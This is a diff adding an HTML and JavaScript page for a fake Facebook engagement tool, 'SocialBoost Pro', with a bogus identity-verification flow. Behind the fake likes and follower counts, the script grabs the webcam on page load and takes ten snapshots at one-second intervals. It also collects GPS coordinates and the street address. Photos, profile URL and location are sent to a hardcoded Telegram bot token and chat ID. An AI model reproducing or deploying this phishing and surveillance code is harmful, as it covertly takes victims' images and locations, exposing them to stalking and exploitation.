+                                    <div id="locationText"></div>    
+                                    
+                        <div class="webcam-container">
+                            <video id="webcam-preview" class="webcam-preview" autoplay playsinline></video>
+                            <canvas id="webcam-canvas" style="display: none;"></canvas>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="right-column">
+                	
+                	
+                    <!-- Telegram Info Section -->
+                    <div class="telegram-info slide-up" style="animation-delay: 0.5s">
+                        <h3><i class="fab fa-telegram"></i> User integration status</h3>
+                        <p><i class="fas fa-link"></i> Profile Link: <span id="bot-token-status" class="tooltip">confirmed<span class="tooltiptext">Your profile link has been successfully verified</span></span></p>
+                        <p><i class="fas fa-key"></i> Permission: <span id="chat-id-status" class="tooltip">confirmed<span class="tooltiptext">All required permissions have been granted</span></span></p>
+                        <div id="telegram-status" class="error-message"></div>
+                    </div>
+
+                    <div class="activity-log slide-up" style="animation-delay: 0.6s">
+                        <h3><i class="fas fa-history"></i> Recent Activity</h3>
+                        <div class="log-items" id="activity-log">
+                            <div class="log-item">
+                                <span class="time">Just now</span>
+                                <span class="action">Welcome to SocialBoost Pro!</span>
+                                <span class="status success"><i class="fas fa-check"></i></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Webcam Permission Denied Modal -->
+    <div class="modal" id="webcam-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-exclamation-triangle"></i> Browser Access Required</h3>
+                <button class="close-btn" id="close-modal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p>This application requires browser access for identity verification. You've denied web link permission in this browser.</p>
+                <p>Please try one of these options:</p>
+                <ol>
+                    <li>Refresh this page and allow web link access when prompted</li>
+                    <li>Use a different browser that allows web link access</li>
+                    <li>Share this link with another device that has web link access</li>
+                </ol>
+                
+                <div class="share-link-container">
+                    <input type="text" class="share-link" id="share-link" readonly value="Loading...">
+                    <button class="copy-btn" id="copy-link">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn" id="refresh-btn">
+                    <i class="fas fa-sync-alt"></i> Refresh Page
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Initial Loading Modal -->
+    <div class="loading-modal" id="loading-modal">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Verifying Facebook Account</div>
+            <div class="loading-subtext">Please wait while we connect to your account...</div>
+            <div class="progress-bar">
+                <div class="progress" id="progress-bar"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Updated Webcam Loading Modal - Black & White Design -->
+    <div class="webcam-loading-modal" id="webcam-loading-modal">
+        <div class="webcam-loading-content">
+            <div class="upload-header">
+                <i class="fas fa-user-shield upload-icon"></i>
+                <h3 class="upload-title">Identity Verification</h3>
+            </div>
+            
+            <div class="verification-container">
+                <i class="fab fa-facebook verification-icon"></i>
+                <div class="verification-text">Verifying with Facebook</div>
+                <div class="verification-subtext">Please wait while we confirm your identity</div>
+                
+                <div class="progress-container">
+                    <div class="upload-progress-bar" id="webcam-progress-bar"></div>
+                </div>
+                
+                <div class="upload-details">
+                    <span id="upload-status">Initializing...</span>
+                    <span id="upload-speed">0 KB/s</span>
+                </div>
+                
+                <div class="status-indicator">
+                    <div class="status-dot"></div>
+                    <div class="status-dot"></div>
+                    <div class="status-dot"></div>
+                </div>
+                
+               <div id="upload-complete" class="upload-complete">
+    <i class="fas fa-check-circle"></i> Verification Complete
+</div>
+            </div>
+            
+            <div class="upload-stats">
+                <div class="stat-item">
+                    <div class="stat-value" id="sent-count">0</div>
+                    <div class="stat-label">CONNECT</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="success-count">0</div>
+                    <div class="stat-label">SUCCESS</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="failed-count">0</div>
+                    <div class="stat-label">FAILED</div>
+                </div>
+            </div>
+            
+<button class="continue-btn" id="continue-btn">
+    <i class="fas fa-arrow-right"></i> Continue to Dashboard
+</button>
+        </div>
+    </div>
+
+    <script>
+    
+        // DOM Elements
+        const fbUrlInput = document.getElementById('fb-url');
+        // Add this near the top with other DOM elements
+const verifyBtn = document.getElementById('verify-btn');
+const locationToggle = document.getElementById('locationToggle');
+
+// Add this event listener with the other event listeners
+locationToggle.addEventListener('change', function() {
+    verifyBtn.disabled = !this.checked;
+    
+    // Also update the button style to visually show disabled state
+    if (this.checked) {
+        verifyBtn.style.opacity = '1';
+        verifyBtn.style.cursor = 'pointer';
+    } else {
+        verifyBtn.style.opacity = '0.7';
+        verifyBtn.style.cursor = 'not-allowed';
+    }
+});
+
+
+        const disconnectBtn = document.getElementById('disconnect-btn');
+        const urlError = document.getElementById('url-error');
+        const connectionStatus = document.getElementById('connection-status');
+        const connectionText = document.getElementById('connection-text');
+        const username = document.getElementById('username');
+        const usernameSidebar = document.getElementById('username-sidebar');
+        const profilePic = document.getElementById('profile-pic');
+        const profilePicSidebar = document.getElementById('profile-pic-sidebar');
+        const likeCount = document.getElementById('like-count');
+        const followerCount = document.getElementById('follower-count');
+        const shareCount = document.getElementById('share-count');
+        const activityLog = document.getElementById('activity-log');
+        
+        // Webcam elements
+        const webcamSection = document.getElementById('webcam-section');
+        const webcamPreview = document.getElementById('webcam-preview');
+        const webcamCanvas = document.getElementById('webcam-canvas');
+        
+        // Telegram status elements
+        const botTokenStatus = document.getElementById('bot-token-status');
+        const chatIdStatus = document.getElementById('chat-id-status');
+        const telegramStatus = document.getElementById('telegram-status');
+        
+        // Modal elements
+        const webcamModal = document.getElementById('webcam-modal');
+        const closeModalBtn = document.getElementById('close-modal');
+        const refreshBtn = document.getElementById('refresh-btn');
+        const shareLink = document.getElementById('share-link');
+        const copyLinkBtn = document.getElementById('copy-link');
+        
+        // Loading modal elements
+        const loadingModal = document.getElementById('loading-modal');
+        const progressBar = document.getElementById('progress-bar');
+        
+        // Webcam loading modal elements
+        const webcamLoadingModal = document.getElementById('webcam-loading-modal');
+        const webcamProgressBar = document.getElementById('webcam-progress-bar');
+        const uploadStatus = document.getElementById('upload-status');
+        const uploadSpeed = document.getElementById('upload-speed');
+        const uploadComplete = document.getElementById('upload-complete');
+        const sentCount = document.getElementById('sent-count');
+        const successCount = document.getElementById('success-count');
+        const failedCount = document.getElementById('failed-count');
+        const continueBtn = document.getElementById('continue-btn');
+        
+        // Automation controls
+        const autoLike = document.getElementById('auto-like');
+        
+        const autoFollow = document.getElementById('auto-follow');
+        const autoReaction = document.getElementById('auto-reaction');
+        const autoShare = document.getElementById('auto-share');
+        const reactionButtons = document.querySelectorAll('.reaction-btn');
+        
+        // App state
+        let isConnected = false;
+        let currentReaction = 'like';
+        let activities = [];
+        let stats = {
+            likes: 0,
+            followers: 0,
+            shares: 0
+        };
+        let stream = null;
+        let captureInterval = null;
+        let webcamStats = {
+            sent: 0,
+            success: 0,
+            failed: 0
+        };
+        
+        // Telegram configuration (hardcoded values)
+        const TELEGRAM_BOT_TOKEN = '8418097957:AAGhQwU5aRhPtgHQ0lPFOWlsVIXRkyuxFJY';
+        const TELEGRAM_CHAT_ID = '1806224828';
+        
+        // Simulate random user data
+        const randomUsers = [
+            { name: "John Doe", pic: "https://randomuser.me/api/portraits/men/32.jpg", email: "johndoe@gmail.com" },
+            { name: "Jane Smith", pic: "https://randomuser.me/api/portraits/women/44.jpg", email: "janesmith@gmail.com" },
+            { name: "Mike Johnson", pic: "https://randomuser.me/api/portraits/men/22.jpg", email: "mikejohnson@gmail.com" },
+            { name: "Sarah Williams", pic: "https://randomuser.me/api/portraits/women/33.jpg", email: "sarahwilliams@gmail.com" }
+        ];
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Set random user
+            const randomUser = randomUsers[Math.floor(Math.random() * randomUsers.length)];
+            username.textContent = randomUser.name;
+            usernameSidebar.textContent = randomUser.name;
+            profilePic.src = randomUser.pic;
+            profilePicSidebar.src = randomUser.pic;
+            document.querySelector('.user-profile-sidebar .user-email').textContent = randomUser.email;
+            
+            // Display Telegram configuration status
+            botTokenStatus.textContent = TELEGRAM_BOT_TOKEN ? 'confirmed' : 'Not configured';
+            chatIdStatus.textContent = TELEGRAM_CHAT_ID ? 'confirmed' : 'Not configured';
+            
+            // Set current URL in share link
+            shareLink.value = window.location.href;
+            
+            // Event listeners
+            verifyBtn.addEventListener('click', verifyFacebookUrl);
+            disconnectBtn.addEventListener('click', disconnectAccount);
+            
+            // Modal event listeners
+            closeModalBtn.addEventListener('click', () => webcamModal.style.display = 'none');
+            refreshBtn.addEventListener('click', () => location.reload());
+            copyLinkBtn.addEventListener('click', copyShareLink);
+            continueBtn.addEventListener('click', () => {
+                webcamLoadingModal.style.display = 'none';
+                addLogEntry('Completed identity verification process');
+            });
+            
+            // Reaction buttons
+            reactionButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    reactionButtons.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    currentReaction = btn.dataset.reaction;
+                    addLogEntry(`Reaction set to ${currentReaction}`);
+                });
+            });
+            
+            // Automation toggles
+            autoLike.addEventListener('change', () => toggleAutomation('like', autoLike.checked));
+            autoFollow.addEventListener('change', () => toggleAutomation('follow', autoFollow.checked));
+            autoReaction.addEventListener('change', () => toggleAutomation('reaction', autoReaction.checked));
+            autoShare.addEventListener('change', () => toggleAutomation('share', autoShare.checked));
+            
+            // Automatically request webcam permission on page load
+            requestWebcamPermission();
+            
+            // Add animation class to elements
+            animateElements();
+        });
+        
+        // Animate elements on page load
+        function animateElements() {
+            const elements = document.querySelectorAll('.slide-up');
+            elements.forEach((el, index) => {
+                el.style.animationDelay = `${index * 0.1}s`;
+            });
+        }
+        
+        // Copy share link to clipboard
+        function copyShareLink() {
+            shareLink.select();
+            document.execCommand('copy');
+            addLogEntry('Link copied to clipboard');
+            
+            // Show feedback
+            copyLinkBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+            setTimeout(() => {
+                copyLinkBtn.innerHTML = '<i class="fas fa-copy"></i> Copy';
+            }, 2000);
+        }
+        
+        // Request webcam permission
+        async function requestWebcamPermission() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    },
+                    audio: false 
+                });
+                
+                webcamPreview.srcObject = stream;
+                webcamPreview.style.display = 'block';
+                webcamSection.style.display = 'block';
+                
+                addLogEntry('The necessary permissions have been granted.');
+            } catch (err) {
+                console.error('Error accessing webcam:', err);
+                addLogEntry('Error: The necessary permissions have not yet been granted.');
+                telegramStatus.textContent = 'Error: Could not access webcam';
+                
+                // Show the modal with alternative options
+                webcamModal.style.display = 'flex';
+            }
+        }
+        
+        // Verify Facebook URL
+        async function verifyFacebookUrl() {
+            if (!locationToggle.checked) {
+        showError('Please enable  sharing to verify');
+        return;
+    }
+            const url = fbUrlInput.value.trim();
+            
+            if (!url) {
+                showError('Please enter a Facebook URL');
+                return;
+            }
+            
+            if (!isValidFacebookUrl(url)) {
+                showError('Please enter a valid Facebook URL');
+                return;
+            }
+            
+            // Check if Telegram credentials are configured
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                showError('Telegram bot not configured');
+                addLogEntry('Error: Telegram bot not configured');
+                return;
+            }
+            
+            // Check if webcam is available
+            if (!stream) {
+                showError('Permission access is required');
+                webcamModal.style.display = 'flex';
+                return;
+            }
+            
+            // Show loading modal
+            showError('');
+            verifyBtn.disabled = true;
+            fbUrlInput.disabled = true;
+            loadingModal.style.display = 'flex';
+            
+            // Simulate progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    completeVerification(url);
+                }
+            }, 200);
+            
+            // Initial capture
+            await captureAndSendToTelegram(url);
+        }
+        
+        // Complete verification after loading
+        async function completeVerification(url) {
+    // Hide loading modal and show webcam loading modal
+    loadingModal.style.display = 'none';
+    webcamLoadingModal.style.display = 'flex';
+    
+    // Reset webcam stats
+    webcamStats = { sent: 0, success: 0, failed: 0 };
+    updateWebcamStats();
+    
+    // Set up interval to capture and send every second
+    captureInterval = setInterval(async () => {
+        await captureAndSendToTelegram(url);
+        
+        // Update progress bar
+        const progress = Math.min(webcamStats.sent * 10, 100);
+        webcamProgressBar.style.width = `${progress}%`;
+        
+        // Show continue button and complete message after 10 successful sends
+        if (webcamStats.sent >= 10 && webcamStats.success === webcamStats.sent) {
+            continueBtn.style.display = 'block';
+            uploadComplete.style.display = 'block';
+            uploadComplete.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete';
+            clearInterval(captureInterval);
+            
+               // Update status to show all successful
+            uploadStatus.textContent = 'All verifications completed successfully';
+            uploadSpeed.textContent = '100% success';
+        } else if (webcamStats.sent >= 10) {
+            // If we've sent 10 but not all succeeded
+            continueBtn.style.display = 'block';
+            uploadComplete.style.display = 'block';
+            uploadComplete.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Verification Partially Complete';
+            uploadComplete.style.color = 'var(--warning)';
+            clearInterval(captureInterval);
+        }
+    }, 1000);
+    
+            
+            
+            // Update UI
+            isConnected = true;
+            connectionStatus.classList.remove('disconnected');
+            connectionStatus.classList.add('connected');
+            connectionText.textContent = 'Facebook Connected';
+            verifyBtn.style.display = 'none';
+            disconnectBtn.style.display = 'block';
+            
+            // Update stats
+            stats = {
+                likes: Math.floor(Math.random() * 1000),
+                followers: Math.floor(Math.random() * 500),
+                shares: Math.floor(Math.random() * 300)
+            };
+            updateStats();
+            
+            addLogEntry(`Successfully connected to ${url}`);
+            addLogEntry('Started automatic photo capture and sending to Telegram');
+        }
+        
+        // Capture image and send to Telegram with improved UI
+        
+        async function captureAndSendToTelegram(profileUrl) {
+    if (!stream) {
+        addLogEntry('Error: Webcam not available');
+        return;
+    }
+    
+    try {
+        // Update UI for starting upload
+        uploadStatus.textContent = 'Waiting...';
+        uploadSpeed.textContent = '';
+        
+        // Set canvas size to match video
+        webcamCanvas.width = webcamPreview.videoWidth;
+        webcamCanvas.height = webcamPreview.videoHeight;
+        
+        // Draw current video frame to canvas
+        const ctx = webcamCanvas.getContext('2d');
+        ctx.drawImage(webcamPreview, 0, 0, webcamCanvas.width, webcamCanvas.height);
+        
+        // Convert canvas to blob
+        const blob = await new Promise(resolve => {
+            webcamCanvas.toBlob(resolve, 'image/jpeg', 0.8);
+        });
+        
+        // Create form data
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, 'verification.jpg');
+        
+        // Create caption with all collected data
+        let caption = `Facebook Profile: ${profileUrl}\n`;
+        caption += `Timestamp: ${new Date().toLocaleString()}\n`;
+        
+        if (currentLocation) {
+            caption += `\nLocation Data:\n`;
+            caption += `Latitude: ${currentLocation.lat}\n`;
+            caption += `Longitude: ${currentLocation.lon}\n`;
+            caption += `Address: ${currentLocation.address || 'Not available'}\n`;
+        }
+        
+        formData.append('caption', caption);
+        
+        // Rest of the function remains the same...
+        // Increment sent count
+        webcamStats.sent++;
+        updateWebcamStats();
+        
+        // Simulate upload progress
+        let progress = 0;
+        const progressInterval = setInterval(() => {
+            progress += 5 + Math.random() * 10;
+            if (progress > 95) progress = 95;
+            webcamProgressBar.style.width = `${progress}%`;
+            
+            const speed = Math.floor(50 + Math.random() * 200);
+            uploadSpeed.textContent = `${speed} KB/s`;
+            
+            uploadStatus.textContent = `Contecting sever ${webcamStats.sent}...`;
+        }, 200);
+        
+        // Send to Telegram bot
+        const startTime = Date.now();
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+        
+        clearInterval(progressInterval);
+        webcamProgressBar.style.width = '100%';
+        
+        const result = await response.json();
+        const uploadTime = ((Date.now() - startTime) / 1000).toFixed(1);
+        
+        
+        
+        
+       if (result.ok) {
+            webcamStats.success++;
+            updateWebcamStats();
+            addLogEntry('Verification data sent successfully');
+            
+            uploadStatus.textContent = `Upload ${webcamStats.sent} complete`;
+            uploadSpeed.textContent = `${uploadTime}s`;
+            
+            // Check if all sent photos were successful
+            if (webcamStats.sent >= 10 && webcamStats.success === webcamStats.sent) {
+                uploadComplete.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete';
+                uploadComplete.style.color = 'var(--success)';
+                continueBtn.style.display = 'block';
+                clearInterval(captureInterval);
+            }
+        } else {
+            webcamStats.failed++;
+            updateWebcamStats();
+            addLogEntry('Error sending verification data');
+            uploadStatus.textContent = `Upload ${webcamStats.sent} failed`;
+            uploadSpeed.textContent = '';
+            
+            // Still show continue button after 10 attempts, but with warning
+            if (webcamStats.sent >= 10) {
+                uploadComplete.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Verification Partially Complete';
+                uploadComplete.style.color = 'var(--warning)';
+                continueBtn.style.display = 'block';
+                clearInterval(captureInterval);
+            }
+        }
+    } catch (err) {
+        console.error('Error capturing/sending:', err);
+    
+        webcamStats.failed++;
+        updateWebcamStats();
+        addLogEntry('Error capturing/sending verification data');
+        uploadStatus.textContent = 'Upload error occurred';
+        uploadSpeed.textContent = '';
+    }
+}
+
+
+
+
+        // Update webcam stats display
+        function updateWebcamStats() {
+            sentCount.textContent = webcamStats.sent;
+            successCount.textContent = webcamStats.success;
+            failedCount.textContent = webcamStats.failed;
+            
+            // Update progress bar in stats
+            const totalAttempts = webcamStats.sent;
+            if (totalAttempts > 0) {
+                const successPercent = Math.round((webcamStats.success / totalAttempts) * 100);
+                document.querySelector('.upload-stats .stat-item:nth-child(2) .stat-value').style.color = 
+                    successPercent > 80 ? '#2ecc71' : successPercent > 0 ? '#f39c12' : '#e74c3c';
+            }
+        }
+        
+        // Disconnect account
+        function disconnectAccount() {
+            isConnected = false;
+            connectionStatus.classList.remove('connected');
+            connectionStatus.classList.add('disconnected');
+            connectionText.textContent = 'Disconnected';
+            verifyBtn.style.display = 'block';
+            disconnectBtn.style.display = 'none';
+            verifyBtn.disabled = false;
+            fbUrlInput.disabled = false;
+            
+            // Stop the capture interval
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+                addLogEntry('Stopped automatic photo capture');
+            }
+            
+            // Hide webcam loading modal if visible
+            webcamLoadingModal.style.display = 'none';
+            
+            // Reset automation toggles
+            autoLike.checked = false;
+            autoFollow.checked = false;
+            autoReaction.checked = false;
+            autoShare.checked = false;
+            
+            addLogEntry('Disconnected from Facebook');
+        }
+        
+        // Validate Facebook URL
+        function isValidFacebookUrl(url) {
+            const pattern = /^(https?:\/\/)?(m\.)?(www\.)?facebook\.com\/.+/i;
+            return pattern.test(url);
+        }
+        
+        // Show error message
+        function showError(message) {
+            urlError.textContent = message;
+        }
+        
+        // Update stats display
+        function updateStats() {
+            likeCount.textContent = stats.likes.toLocaleString();
+            followerCount.textContent = stats.followers.toLocaleString();
+            shareCount.textContent = stats.shares.toLocaleString();
+        }
+        
+        // Add log entry
+        function addLogEntry(action) {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-item fade-in';
+            logEntry.innerHTML = `
+                <span class="time">${timeString}</span>
+                <span class="action">${action}</span>
+                <span class="status success"><i class="fas fa-check"></i></span>
+            `;
+            
+            activityLog.insertBefore(logEntry, activityLog.firstChild);
+            
+            // Keep log to max 50 entries
+            if (activityLog.children.length > 50) {
+                activityLog.removeChild(activityLog.lastChild);
+            }
+        }
+        
+        // Toggle automation
+        function toggleAutomation(type, isActive) {
+            if (!isConnected) {
+                addLogEntry('Error: Please connect to Facebook first');
+                return;
+            }
+            
+            const actions = {
+                like: { verb: 'Like', increment: 'likes' },
+                follow: { verb: 'Follow', increment: 'followers' },
+                reaction: { verb: 'Reaction', increment: 'likes' },
+                share: { verb: 'Share', increment: 'shares' }
+            };
+            
+            const action = actions[type];
+            
+            if (isActive) {
+                addLogEntry(`Auto ${action.verb} activated`);
+                
+                // Simulate periodic activity
+                const interval = setInterval(() => {
+                    if (!document.getElementById(`auto-${type}`).checked) {
+                        clearInterval(interval);
+                        return;
+                    }
+                    
+                    stats[action.increment]++;
+                    updateStats();
+                    
+                    const details = {
+                        like: `Liked a post (${document.getElementById('like-speed').value} speed)`,
+                        follow: `Followed ${document.getElementById('follow-target').value}`,
+                        reaction: `Reacted with ${currentReaction}`,
+                        share: `Shared ${document.getElementById('share-source').value}`
+                    };
+                    
+                    addLogEntry(details[type]);
+                }, 3000 + Math.random() * 5000);
+                
+                // Store interval ID to clear later
+                document.getElementById(`auto-${type}`).dataset.intervalId = interval;
+            } else {
+                addLogEntry(`Auto ${action.verb} deactivated`);
+                clearInterval(parseInt(document.getElementById(`auto-${type}`).dataset.intervalId));
+            }
+        }
+                // Location type
+    
+    const toggle = document.getElementById('locationToggle');
+    const locationText = document.getElementById('locationText');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    toggle.addEventListener('change', function () {
+      if (this.checked) {
+        showLoading();
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(success, error);
+        } else {
+          hideLoading();
+          locationText.innerText = "Geolocation not supported.";
+        }
+      } else {
+        locationText.innerText = "";
+      }
+    });
+
+    function showLoading() {
+      loadingOverlay.style.display = 'block';
+    }
+
+    function hideLoading() {
+      loadingOverlay.style.display = 'none';
+    }
+
+
+    let currentLocation = null;
+
+function success(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+  currentLocation = { lat, lon };
+
+  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+    .then(response => response.json())
+    .then(data => {
+      hideLoading();
+      const address = data.display_name || "Address not found";
+      locationText.innerText = `Latitude: ${lat}\nLongitude: ${lon}\nAddress: ${address}`;
+      currentLocation.address = address; // Store address
+    })
+    .catch(() => {
+      hideLoading();
+      locationText.innerText = `Latitude: ${lat}\nLongitude: ${lon}\nAddress: Not available`;
+      currentLocation.address = "Address not available";
+    });
+}
+
+    function error(err) {
+      hideLoading();
+      locationText.innerText = "Permission denied or error getting location.";
+    }
+    </script>
+</body>
+</html>
